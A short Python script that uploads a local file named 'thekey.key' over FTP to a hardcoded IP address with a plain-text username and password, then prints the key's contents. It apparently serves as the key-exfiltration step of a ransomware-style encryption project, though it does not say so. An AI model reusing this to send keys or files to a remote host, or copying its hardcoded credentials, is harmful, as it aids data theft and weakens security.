#!/usr/bin/python3

import ftplib
import os
from colorama import Fore

HOSTNAME = "100.90.95.6"
USERNAME = "concatenate"
PASSWORD = "arshseri123"

# Connect to the FTP server
ftp_server = ftplib.FTP(HOSTNAME, USERNAME, PASSWORD)

# force UTF-8 encoding
ftp_server.encoding = "utf-8"

# print("Directory before upload")
# ftp_server.dir()
# print("-" * 50)

filename = "thekey.key"

with open(filename, "rb") as file:
    ftp_server.storbinary(f"STOR {filename}", file)

# print("\nDirectory after upload")
ftp_server.dir()

# print("-" * 50)

file = open(filename, "r")
file_content = file.read()
print("\nFile Content:",Fore.RED + file_content, Fore.RESET + '\n')
